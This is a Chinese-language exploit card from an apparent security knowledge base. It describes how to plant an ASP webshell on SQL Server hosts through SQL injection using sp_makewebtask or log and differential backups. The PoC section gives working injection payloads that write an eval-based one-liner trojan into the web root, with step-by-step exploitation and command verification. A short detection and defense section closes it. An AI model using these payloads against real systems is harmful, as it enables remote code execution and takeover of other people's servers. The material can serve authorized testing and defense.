---
id: web-generic-sqli-mssql-backup-sp-makewebtask-webshell
title: MSSQL 非 xp_cmdshell 写 Webshell：sp_makewebtask 与日志/差异备份
type: scenario
domain: web
path: web/generic/sqli
technique: mssql-backup-sp-makewebtask-webshell
tags:
- sqli
- mssql
- webshell
- backup
- log-backup
- differential-backup
- sp-makewebtask
- db-owner
- sysadmin
cve: []
severity: critical
confidence: medium
status: verified
affected_versions: sp_makewebtask 适用于 SQL Server 2005 及更早；日志备份要求数据库为 FULL 恢复模式且已做过完整备份（原文以 SQL Server 2008 为例）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V32
  verified_at: '2026-11-05T06:05:58+08:00'
  notes: 已对照原文核对：sp_makewebtask(<=2005)、FULL恢复+完整备份后日志备份、差异备份WITH DIFFERENTIAL FORMAT、image列存hex shell等命令与原文一致；原文未给执行结果，PoC未在本机复现；affected_versions按原文标记保留
url: /docs/web/generic/sqli/web-generic-sqli-mssql-backup-sp-makewebtask-webshell/
draft: false
kb_aliases:
- MSSQL 备份写马
- SQL Server 日志备份 getshell
- SQL Server 差异备份 getshell
- sp_makewebtask 写 Webshell
- db_owner 写马
---

## 一句话结论

当 SQL Server 注入点不具备 `xp_cmdshell` 条件时，仍可利用文件写入能力落地 Webshell：`sysadmin` 权限可用 `sp_makewebtask` 直接把查询结果写成 ASP 文件；`db_owner` 权限可把一句话木马写入 `image` 列，再通过日志备份或差异备份把数据库/日志导出到 Web 目录下的 `.asp`/`.aspx` 文件，让 Web 服务器解析其中的脚本代码。

## 原理

- **`sp_makewebtask` 直接写文件**：SQL Server 2005 及更早版本内置 `sp_makewebtask` 存储过程，可把查询结果按 HTML/文本写入指定路径。攻击者让查询返回一段 ASP/JScript 代码（如 `<%eval(request("cmd"))%>`），并把输出路径指向 Web 根目录下的 `.asp` 文件，即可直接得到 Webshell。该过程通常需要 `sysadmin` 权限。
- **备份文件本质是数据文件**：SQL Server 的完整/日志/差异备份会把数据库页（包括用户表数据）写入磁盘文件。`db_owner` 角色拥有当前数据库的备份权限，可以把包含 Webshell 字符串的表数据备份到 Web 目录。
- **日志备份链**：
  1. 把数据库恢复模式设为 `FULL`；
  2. 做一次完整备份建立日志链；
  3. 创建含 `image` 列的表，把 Webshell 的十六进制写入该列；
  4. 再把日志备份到 Web 目录下的 `.asp` 文件。日志备份中会包含新插入行的数据页/日志记录，ASP 解析器在二进制内容中遇到 `<% ... %>` 仍会执行。
- **差异备份**：先做完整备份，创建表并插入 Webshell，再用 `WITH DIFFERENTIAL, FORMAT` 把差异备份写到 `.asp` 文件；差异备份包含自上次完整备份以来变化的数据页，同样携带 Webshell 内容。
- **为什么能执行**：Web 服务器按扩展名（`.asp`/`.aspx`）选择解析器，不要求文件是纯文本；备份文件前面的二进制头不会阻止解析器在后文遇到脚本标签时执行。前提是 SQL Server 服务账户对 Web 目录有写权限，且路径已知。

## 触发条件

- 存在 SQL 注入且支持堆叠语句（SQL Server 常见）。
- 当前账户为 `sysadmin`（`sp_makewebtask`）或 `db_owner`（备份写马）。
- 已知 Web 根目录绝对路径，SQL Server 服务账户对该目录有写权限。
- Web 服务器会解析写入的后缀（`.asp`/`.aspx`/`.asa` 等），且 WAF 未拦截备份/存储过程关键字。
- 日志备份还需数据库处于 `FULL` 恢复模式且已有完整备份；差异备份需已有完整备份。
- `sp_makewebtask` 仅在 SQL Server 2005 及更早版本可用。

## 利用步骤

1. 判断权限：`SELECT IS_SRVROLEMEMBER('sysadmin')`、`SELECT IS_MEMBER('db_owner')`。
2. 确认堆叠执行与 Web 路径（报错、`@@basedir`、常见 `C:\inetpub\wwwroot\` 等）。
3. sysadmin 且版本 ≤2005：执行 `sp_makewebtask`，把返回 ASP 代码的查询写到 Web 目录。
4. db_owner：按日志备份或差异备份流程，把 Webshell 写入 `image` 列并备份到 Web 目录 `.asp` 文件。
5. 访问写入的文件，用 `?cmd=whoami` 等参数验证命令执行。
6. 清理临时表、备份文件与恢复模式变更（可选，备份文件可能残留）。

## PoC

`sp_makewebtask`（sysadmin，SQL Server ≤2005）：

```sql
;exec sp_makewebtask 'C:\inetpub\wwwroot\x1.asp','select ''<%eval(request("cmd"))%>'''--
```

日志备份（db_owner）：

```sql
;alter database test set RECOVERY FULL--
backup database test to disk = 'C:\bak.bak';--
;create table cmd (a image)--
;backup log test to disk = 'C:\users\public\111' with init--
;insert into cmd (a) values (0x3c252040... )--   -- 一句话木马的十六进制
backup log test to disk = 'C:\users\public\2.asp';--
;drop table cmd--
```

差异备份（db_owner）：

```sql
backup database test to disk = 'C:\users\public\bak.bak';--
;create table cmd (a image)--
;insert into cmd (a) values (0x3c252040... )--
backup database test to disk = 'C:\users\public\d.asp' WITH DIFFERENTIAL, FORMAT;--
```

说明：原文中的十六进制是一段 JScript ASP 一句话木马；实际利用时替换为对应 Web 语言的 shell 代码（ASP/ASPX）。备份文件包含数据库页/日志的二进制内容，Web 解析器只识别其中的脚本标签。

## 变体与关联

- 变体（权限）：`sp_makewebtask` 需 sysadmin；日志/差异备份需 db_owner；若两者都没有，可寻找其他文件写入原语（`xp_cmdshell`、OLE 自动化、`bcp`）。
- 变体（备份类型）：完整备份、日志备份、差异备份、文件组备份；只要能把包含 Webshell 的页写到 Web 目录即可。
- 变体（Web 语言）：ASP/JScript、ASPX、ASA 等；按目标 Web 服务器选择后缀与代码。
- 关联：[[web-generic-sqli-mssql-stacked-xp-cmdshell]]（sysadmin 命令执行；本卡适用于 xp_cmdshell 不可用或只需文件写入的场景）。
- 关联：[[web-generic-sqli-mysql-outfile-general-log-webshell]]（MySQL 的对应文件写入思路）。
- 边界：SQL Server 服务账户对 Web 目录无写权限、Web 目录不解析脚本、目标版本不支持 `sp_makewebtask`、WAF 拦截 `backup`/`sp_makewebtask` 时失效。

## 检测与防御

- 修复：SQL 参数化，消除注入入口；应用账户最小权限。
- 权限：应用数据库账户不授予 `sysadmin`/`db_owner`；备份操作使用独立账户与受控目录。
- 文件系统：Web 根目录对 SQL Server 服务账户不可写；备份目录与 Web 目录分离，禁止数据库写入可解析脚本的后缀。
- 检测：SQL 日志中出现 `sp_makewebtask`、`backup database`、`backup log`、`WITH DIFFERENTIAL`、`RECOVERY FULL`、`create table ... image`；Web 目录新增 `.asp`/`.aspx`/`.asa` 备份文件；SQL Server 进程写 Web 目录；数据库恢复模式被异常修改。
- 运营：定期审计数据库角色成员与备份路径；监控备份文件大小/路径异常；对 Web 目录做文件完整性基线。
